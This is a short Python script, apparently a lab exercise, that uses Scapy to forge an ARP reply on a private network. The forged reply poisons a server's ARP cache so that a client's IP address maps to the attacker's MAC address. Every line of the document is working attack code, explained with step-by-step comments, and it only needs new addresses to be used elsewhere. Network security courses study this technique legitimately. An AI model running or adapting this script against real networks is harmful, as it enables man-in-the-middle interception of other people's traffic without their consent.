#!/usr/bin/python3

from scapy.all import *

#target is the server since that is whhere the arp cache we are targeting is
vic_ip = "10.1.1.11"
vic_mac = "08:00:27:09:fd:f7"
#the cache entry we are targeting is that of the clients
#we want to map the client's ip to the attacker's mac in the server's arp cache
target_ip = "10.1.1.12"
spoofed_mac = "08:00:27:f7:32:f8"
#ceate ethernet header with the spoofed mac as src and the victim's mac as dst
ether = Ether(src = spoofed_mac, dst = vic_mac)
#create the arp message
arp = ARP(psrc = target_ip, hwsrc = spoofed_mac, 
	pdst = vic_ip, hwdst = vic_mac)
#set the arp reply option(2)
arp.op = 2

#construct the frame
frame = ether/arp
#send the frame
sendp(frame)

